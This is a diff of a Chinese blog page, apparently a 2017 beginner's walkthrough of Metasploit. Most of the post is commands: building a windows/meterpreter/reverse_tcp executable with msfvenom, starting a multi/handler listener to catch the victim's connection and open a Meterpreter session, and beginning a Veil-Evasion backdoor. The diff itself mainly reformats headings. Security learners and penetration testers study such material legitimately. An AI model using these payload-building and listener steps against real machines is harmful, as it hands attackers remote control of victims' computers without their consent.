@@ -15,43 +15,34 @@
     <meta name="keywords" content="metasploit," />
   
 
-  <meta name="description" content="#msf简单使用：(以windows/meterpreter/reverse_tcp为例)
-##1.payload设置：
-
+  <meta name="description" content="msf简单使用：(以windows/meterpreter/reverse_tcp为例)1.payload设置：
 新开终端
 
 msfvenom -l
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件
-##2.监听：
-
-进">
+2.监听：
+进入metaspl">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msf初体验">
 <meta property="og:url" content="http://yoursite.com/2017/02/06/msf初体验/index.html">
 <meta property="og:site_name" content="sun1024">
-<meta property="og:description" content="#msf简单使用：(以windows/meterpreter/reverse_tcp为例)
-##1.payload设置：
-
+<meta property="og:description" content="msf简单使用：(以windows/meterpreter/reverse_tcp为例)1.payload设置：
 新开终端
 
 msfvenom -l
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件
-##2.监听：
-
-进">
-<meta property="og:updated_time" content="2017-02-06T13:48:11.443Z">
+2.监听：
+进入metaspl">
+<meta property="og:updated_time" content="2017-02-06T13:56:36.973Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msf初体验">
-<meta name="twitter:description" content="#msf简单使用：(以windows/meterpreter/reverse_tcp为例)
-##1.payload设置：
-
+<meta name="twitter:description" content="msf简单使用：(以windows/meterpreter/reverse_tcp为例)1.payload设置：
 新开终端
 
 msfvenom -l
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件
-##2.监听：
-
-进">
+2.监听：
+进入metaspl">
 
   
 
@@ -191,6 +182,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f ex
 </div>
 
 
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf简单使用：-以windows-meterpreter-reverse-tcp为例"><span class="toc-text">msf简单使用：(以windows/meterpreter/reverse_tcp为例)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-payload设置："><span class="toc-text">1.payload设置：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-监听："><span class="toc-text">2.监听：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-插入攻击荷载"><span class="toc-text">3.插入攻击荷载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-使用run-或者-exploit-启动攻击"><span class="toc-text">4.使用run 或者 exploit 启动攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PS"><span class="toc-text">PS:</span></a></li></ol>
+  </div>
+
 
 
 <div class="content content-post CENTER">
@@ -231,21 +227,17 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f ex
 
   <div class="article-content">
     
-      <p>#msf简单使用：(以windows/meterpreter/reverse_tcp为例)</p>
-<p>##1.payload设置：</p>
-<ul>
+      <h1 id="msf简单使用：-以windows-meterpreter-reverse-tcp为例"><a href="#msf简单使用：-以windows-meterpreter-reverse-tcp为例" class="headerlink" title="msf简单使用：(以windows/meterpreter/reverse_tcp为例)"></a>msf简单使用：(以windows/meterpreter/reverse_tcp为例)</h1><h2 id="1-payload设置："><a href="#1-payload设置：" class="headerlink" title="1.payload设置："></a>1.payload设置：</h2><ul>
 <li>新开终端</li>
 </ul>
 <p><code>msfvenom -l</code></p>
 <p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p>
-<p>##2.监听：</p>
-<ul>
+<h2 id="2-监听："><a href="#2-监听：" class="headerlink" title="2.监听："></a>2.监听：</h2><ul>
 <li>进入metasploit</li>
 </ul>
 <p><code>use exploit/multi/handler</code></p>
 <p><code>show options</code></p>
-<p>##3.插入攻击荷载</p>
-<ul>
+<h2 id="3-插入攻击荷载"><a href="#3-插入攻击荷载" class="headerlink" title="3.插入攻击荷载"></a>3.插入攻击荷载</h2><ul>
 <li>show payloads</li>
 </ul>
 <p><code>set payload windows/meterpreter_reverse_tcp</code></p>
@@ -254,8 +246,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f ex
 </ul>
 <p><code>set lhost 192.168.1.120</code></p>
 <p><code>set lport 4444</code></p>
-<p>##4.使用run 或者 exploit 启动攻击</p>
-<ul>
+<h2 id="4-使用run-或者-exploit-启动攻击"><a href="#4-使用run-或者-exploit-启动攻击" class="headerlink" title="4.使用run 或者 exploit 启动攻击"></a>4.使用run 或者 exploit 启动攻击</h2><ul>
 <li><p>等待被攻击主机中招，即可拿到session</p>
 </li>
 <li><p>使用jobs停止攻击</p>
@@ -264,8 +255,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f ex
 <p><code>sessions -l  //获取session列表</code></p>
 <p><code>sessions -i 1 //进入meterpreter</code></p>
 <p>==============================</p>
-<p>#PS:</p>
-<p>使用veil-veasion生成后门：<br>打开终端</p>
+<h1 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h1><p>使用veil-veasion生成后门：<br>打开终端</p>
 <p><code>veil-veasion</code></p>
 <p><code>list</code></p>
 <p><code>use 6 //以c为例</code></p>
@@ -327,7 +317,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f ex
   <span id="cover" class="cover hide"></span>
   <div id="modal-dialog" class="modal-dialog hide-dialog">
     <div class="modal-header">
-      <span id="close" class="btn-close">关闭</span>
+      <span id="close" class="btn-close">Close</span>
     </div>
     <hr>
     <div class="modal-body">
